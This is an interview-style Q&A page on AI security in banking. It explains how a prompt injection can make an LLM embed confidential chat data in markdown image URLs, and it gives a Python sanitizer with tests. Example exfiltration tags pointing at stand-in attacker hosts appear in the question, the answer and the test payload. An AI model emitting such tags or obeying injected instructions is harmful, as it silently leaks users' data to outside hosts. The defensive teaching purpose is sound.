# Q0908 · Markdown injection and image exfiltration tags

| Section | Topic | Difficulty |
|---|---|---|
| AI Security, Guardrails & Responsible AI in a Bank | Prompt injection defense | Medium |

## Question

Explain how markdown rendering in LLM interfaces allows data exfiltration via image tags (`![img](https://evil.com/leak?data=...)`), and write Python code implementing an output markdown sanitizer.

## Answer

If an attacker injects a prompt that causes the LLM to summarize confidential chat history into the query parameters of a markdown image URL:
`![data](https://attacker.com/log?leak=CONFIDENTIAL_DATA)`
When the frontend renders this markdown, the user's browser automatically issues an HTTP GET request to `attacker.com`, exfiltrating the confidential data without the user's knowledge.

```python
import re


class MarkdownExfiltrationSanitizer:
    # Pattern matching markdown image syntax: ![alt](url)
    IMAGE_PATTERN = re.compile(r"!\[(.*?)\]\((https?://[^\s)]+)\)", re.IGNORECASE)

    @classmethod
    def sanitize_output(cls, markdown_text: str, allowed_image_domains: list[str]) -> str:
        def replace_image(match):
            alt_text = match.group(1)
            url = match.group(2)
            # Check domain against corporate whitelist
            for domain in allowed_image_domains:
                if url.startswith(f"https://{domain}/"):
                    return match.group(0)  # Allowed
            # Strip image tag to prevent exfiltration
            return f"[Image removed: {alt_text}]"

        return cls.IMAGE_PATTERN.sub(replace_image, markdown_text)


allowed = ["assets.jpmc.com", "charts.internal.jpmc"]

# Attack payload attempting data exfiltration
leaked_output = (
    "Here is the chart: "
    "![Secret](https://attacker-server.com/collect?token=sk-9921) "
    "and corporate logo: ![Logo](https://assets.jpmc.com/logo.png)"
)

clean_output = MarkdownExfiltrationSanitizer.sanitize_output(leaked_output, allowed)
assert "https://attacker-server.com" not in clean_output
assert "[Image removed: Secret]" in clean_output
assert "https://assets.jpmc.com/logo.png" in clean_output
```

## Likely follow-ups

- How does Content Security Policy (CSP) `img-src` header at the browser level block this attack?
- What other markdown constructs (e.g. hyperlinks, raw HTML tags) can trigger data leakage?

---

[← Q0907](../../batch_10_ai_security_responsible_ai/0907_recursive_prompt_injection_in_multi_agent_tool_communication/README.md) · [AI Security, Guardrails & Responsible AI in a Bank index](../README.md) · [All sections](../../README.md) · [Q0909 →](../../batch_10_ai_security_responsible_ai/0909_dual_llm_architecture_privileged_executor_vs_quarantined/README.md)
